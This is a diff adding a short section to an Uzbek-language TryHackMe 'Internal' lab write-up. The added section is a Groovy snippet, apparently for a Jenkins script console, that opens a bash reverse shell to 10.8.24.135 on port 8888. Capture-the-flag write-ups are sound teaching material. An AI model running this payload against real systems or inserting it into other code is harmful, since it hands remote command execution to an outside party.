@@ -522,6 +522,16 @@ O'zlarini scriptlash tilida reverse shell joylaymiz.
 
 ![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/internal_6.jpg)
 
+Reverse Shell:
+```
+def host = "10.8.24.135"
+def port = 8888
+
+String[] cmd = ["/bin/bash", "-c", "bash -i >& /dev/tcp/${host}/${port} 0>&1"]
+
+Process p = Runtime.getRuntime().exec(cmd)
+p.waitFor()
+```
 
 
 Natija:
